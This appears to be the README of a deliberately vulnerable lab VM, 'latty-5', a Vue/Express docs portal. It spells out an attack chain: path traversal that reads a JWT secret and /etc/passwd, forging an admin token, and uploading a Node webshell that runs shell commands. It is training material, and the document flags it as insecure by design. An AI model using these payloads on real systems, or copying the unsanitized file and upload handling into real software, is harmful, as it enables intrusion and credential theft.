### latty-5

**Latty-5** — a Vue 3 + Node/Express **docs portal** with an admin **extension console**, and a
**lateral-movement chain** that starts with **LFI / path traversal**. No admin account is given — you
have to forge one.

```
docker build -t latty-5 ./vms/latty-5
docker run --rm -p 8080:80 latty-5      # http://localhost:8080
```

#### The chain: LFI → JWT secret → forged admin → unrestricted upload → webshell → RCE

1. **LFI / path traversal** (`VULN[lfi]`, public `GET /api/docs?file=`). The doc viewer joins the name
   onto the docs dir with no sanitization:
   ```
   /api/docs?file=../secret/jwt.secret     → h4rdc0ded-hs256-9f2a7c4e8b1d6033
   ```
   (also `../../../../etc/passwd`, source files, etc.)

2. **Forge an admin token.** Tokens are **HS256** signed with that secret. Mint one with `role:admin`:
   ```
   {"username":"x","role":"admin"}  signed HS256 with the leaked secret
   ```

3. **Unrestricted upload** (`VULN[upload]`, admin `POST /api/admin/extensions`). Any filename, any
   content — upload a `.js` webshell:
   ```json
   { "filename": "shell.js",
     "content": "module.exports = () => require('child_process').execSync('id').toString()" }
   ```

4. **Webshell RCE** (`VULN[rce]`, admin `POST /api/admin/extensions/shell.js/run`). The console
   `require()`s and runs the uploaded module → command execution on the server.

Admin endpoints are `403` without a forged token, so the LFI → secret → forge steps are mandatory.
Deliberately insecure by design — run only locally / on an isolated network.
